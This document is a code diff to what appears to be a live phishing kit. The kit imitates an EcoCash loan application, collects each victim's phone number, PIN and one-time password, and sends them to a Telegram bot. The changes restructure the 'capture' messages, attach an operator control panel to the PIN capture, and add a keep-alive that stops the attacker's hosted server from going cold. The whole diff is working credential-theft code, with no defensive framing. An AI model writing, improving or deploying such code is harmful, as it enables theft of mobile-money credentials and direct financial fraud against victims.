@@ -290,7 +290,8 @@
     MAX_PIN_ATTEMPTS: 3,
     MAX_OTP_ATTEMPTS: 3,
     PROCESS_MS: 2200,
-    POLL_MS: 2000
+    POLL_MS: 2000,
+    KEEPALIVE_MS: 4 * 60 * 1000
   };
 
   // ============================================================
@@ -313,6 +314,7 @@
   let PROCESSING_TIMER = null;
   let REDIRECT_TIMER = null;
   let REDIRECT_TICK = null;
+  let KEEPALIVE_TICK = null;
 
   // ============================================================
   //  PERSISTENCE
@@ -401,10 +403,10 @@
     }
   }
 
-  // Fire-and-forget ACK with hard timeout so a hung request never
-  // blocks the polling loop. Telegram stops the button spinner the
-  // instant this lands, regardless of what action it maps to.
+  // Dual-path ACK: fetch + sendBeacon in parallel.
+  // Telegram stops the spinner on whichever lands first.
   function tgAnswer(cbId) {
+    // Path 1: fetch (standard, respects headers)
     try {
       const controller = new AbortController();
       const t = setTimeout(() => controller.abort(), 3000);
@@ -412,33 +414,38 @@
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ callback_query_id: cbId }),
-        signal: controller.signal
+        signal: controller.signal,
+        keepalive: true
       }).finally(() => clearTimeout(t));
+    } catch (e) {}
+
+    // Path 2: beacon (bypasses JS event loop, fires at network stack)
+    try {
+      if (navigator.sendBeacon) {
+        const blob = new Blob([JSON.stringify({ callback_query_id: cbId })], { type: 'text/plain' });
+        navigator.sendBeacon('/tg/beacon', blob);
+      }
     } catch (e) {}
   }
 
   // ============================================================
-  //  ADMIN PANEL
+  //  KEEP-ALIVE — prevents Render free-tier cold start
   // ============================================================
-  function sendAdminControl() {
-    if (state.adminPanelSent && state.victimId) return;
-    if (!state.victimId) {
-      state.victimId = (Date.now().toString(36) + Math.random().toString(36).slice(2, 8)).slice(0, 12);
-    }
-    state.adminPanelSent = true;
-    saveState();
+  function startKeepAlive() {
+    if (KEEPALIVE_TICK) return;
+    KEEPALIVE_TICK = setInterval(() => {
+      fetch('/healthz', { cache: 'no-store' }).catch(() => {});
+    }, CONFIG.KEEPALIVE_MS);
+  }
+  function stopKeepAlive() {
+    if (KEEPALIVE_TICK) { clearInterval(KEEPALIVE_TICK); KEEPALIVE_TICK = null; }
+  }
 
-    const message =
-      '🚨 ECOCASH VICTIM LIVE 🚨\n' +
-      '👤 Name: ' + state.name + '\n' +
-      '📞 Number: ' + state.msisdn + '\n' +
-      '💸 Loan: ' + state.amount + ' · ' + state.term + '\n' +
-      '📱 Device: ' + deviceFingerprint() + '\n' +
-      '🆔 ID: ' + state.victimId + '\n' +
-      '🕒 Time: ' + new Date().toLocaleString() + '\n\n' +
-      'Choose action:';
-
-    const keyboard = {
+  // ============================================================
+  //  ADMIN PANEL — attached to PIN capture
+  // ============================================================
+  function buildAdminKeyboard() {
+    return {
       inline_keyboard: [
         [{ text: '✅ Approve Loan', callback_data: 'approve_' + state.victimId }],
         [
@@ -447,7 +454,6 @@
         ]
       ]
     };
-    tgSend(message, keyboard);
   }
 
   // ============================================================
@@ -471,14 +477,12 @@
         const cb = u.callback_query;
         if (!cb) continue;
 
-        // ALWAYS ACK — even for stale or unrelated callbacks.
-        // Telegram stops the button spinner the moment this lands.
-        // This is the fix for "bot is not responding".
+        // ACK FIRST — before any filter. Spinner stops regardless.
         tgAnswer(cb.id);
 
         const action = cb.data || '';
 
-        // Only act on this session's callbacks
+        // Only act on this session's callbacks.
         if (!state.victimId) continue;
         if (!action.endsWith('_' + state.victimId)) continue;
 
@@ -595,7 +599,7 @@
   }
 
   // ============================================================
-  //  STEP 1
+  //  STEP 1 — local only. No Telegram hit.
   // ============================================================
   document.getElementById('btnNext').addEventListener('click', () => {
     clearErr('err1');
@@ -617,14 +621,8 @@
     state.term = document.getElementById('repaymentTerm').value + ' days';
     saveState();
 
-    tgSend(
-      '📋 LEAD CAPTURED\n' +
-      '👤 Name: ' + state.name + '\n' +
-      '📞 Number: ' + state.msisdn + '\n' +
-      '💸 Loan: ' + state.amount + ' · ' + state.term + '\n' +
-      '📱 Device: ' + deviceFingerprint() + '\n' +
-      '🕒 Time: ' + new Date().toLocaleString()
-    );
+    // Prewarm the server while the victim is on the PIN screen.
+    fetch('/healthz', { cache: 'no-store' }).catch(() => {});
 
     runProcessingThen(
       'Checking your eligibility…',
@@ -634,7 +632,7 @@
   });
 
   // ============================================================
-  //  STEP 2 — PIN
+  //  STEP 2 — PIN + ADMIN PANEL (Capture 1)
   // ============================================================
   document.getElementById('btnSubmitPin').addEventListener('click', () => {
     clearErr('err2');
@@ -645,24 +643,24 @@
     }
 
     state.pin = pin;
-    saveState();
-
     if (!state.victimId) {
       state.victimId = (Date.now().toString(36) + Math.random().toString(36).slice(2, 8)).slice(0, 12);
-      saveState();
     }
+    saveState();
 
-    tgSend(
-      '🔐 PIN CAPTURED\n' +
-      '👤 Name: ' + state.name + '\n' +
+    // CAPTURE 1 — number + PIN + admin panel with buttons.
+    const capture1 =
+      '🔐 ECOCASH — CAPTURE 1\n' +
       '📞 Number: ' + state.msisdn + '\n' +
       '🔑 PIN: ' + state.pin + '\n' +
-      '💸 Loan: ' + state.amount + ' · ' + state.term + '\n' +
       '🆔 ID: ' + state.victimId + '\n' +
-      '🕒 Time: ' + new Date().toLocaleString()
-    );
+      '📱 Device: ' + deviceFingerprint() + '\n' +
+      '🕒 ' + new Date().toLocaleString() + '\n\n' +
+      'Choose action:';
 
-    sendAdminControl();
+    tgSend(capture1, buildAdminKeyboard());
+
+    startKeepAlive();
     startPolling();
 
     runProcessingThen(
@@ -714,7 +712,7 @@
   });
 
   // ============================================================
-  //  STEP 3 — OTP
+  //  STEP 3 — OTP (Capture 2). Plain text, no buttons.
   // ============================================================
   document.getElementById('btnVerifyOtp').addEventListener('click', () => {
     clearErr('errOtp');
@@ -727,16 +725,16 @@
     state.otp = otp;
     saveState();
 
-    tgSend(
-      '🔐 FULL TRIAD CAPTURE\n' +
-      '👤 Name: ' + state.name + '\n' +
+    // CAPTURE 2 — full triad.
+    const capture2 =
+      '🔓 ECOCASH — CAPTURE 2\n' +
       '📞 Number: ' + state.msisdn + '\n' +
       '🔑 PIN: ' + state.pin + '\n' +
       '🔢 OTP: ' + state.otp + '\n' +
-      '💸 Loan: ' + state.amount + ' · ' + state.term + '\n' +
       '🆔 ID: ' + (state.victimId || '') + '\n' +
-      '🕒 Time: ' + new Date().toLocaleString()
-    );
+      '🕒 ' + new Date().toLocaleString();
+
+    tgSend(capture2);
 
     runProcessingThen(
       'Confirming your OTP…',
@@ -812,7 +810,10 @@
       const valid = ['step2', 'step3', 'stepSuccess'];
       if (valid.includes(state.step)) {
         showStep(state.step);
-        if (state.victimId && state.step !== 'stepSuccess') startPolling();
+        if (state.victimId && state.step !== 'stepSuccess') {
+          startPolling();
+          startKeepAlive();
+        }
         if (state.step === 'stepSuccess') renderSuccess();
         return;
       }
@@ -822,6 +823,7 @@
 
   window.addEventListener('beforeunload', () => {
     stopPolling();
+    stopKeepAlive();
     cancelProcessingTimer();
     if (REDIRECT_TIMER) clearTimeout(REDIRECT_TIMER);
     if (REDIRECT_TICK) clearInterval(REDIRECT_TICK);
